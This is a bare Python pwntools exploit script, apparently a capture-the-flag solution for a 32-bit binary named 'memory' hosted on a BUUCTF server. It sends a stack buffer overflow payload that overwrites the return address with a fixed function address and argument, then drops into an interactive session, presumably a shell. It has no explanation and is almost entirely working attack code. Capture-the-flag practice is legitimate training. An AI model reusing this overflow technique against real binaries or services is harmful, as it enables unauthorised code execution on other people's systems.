from pwn import *
from LibcSearcher import LibcSearcher

#context(os='linux', arch='amd64', log_level='debug')
#
context(os='linux', arch='i386', log_level='debug')
#io = process('./memory')
#
io = connect('node5.buuoj.cn',27591)
elf=ELF('./memory')
#gdb.attach(io)

def rl():
	io.recvline()
def ru(s):
	io.recvuntil(s)
def sl(s):
	io.sendline(s)
def sd(s):
	io.send(s)
def logsc(s):
	log.success(s)

def plt(s):
	return elf.plt[s]
def got(s):
	return elf.got[s]

#ru('> ')
fa=0x080487E0
sa=0x080485C9
pl=b'b'*(0x13+4)
pl+=p32(sa)+p32(fa)
sl(pl)

#
io.interactive()
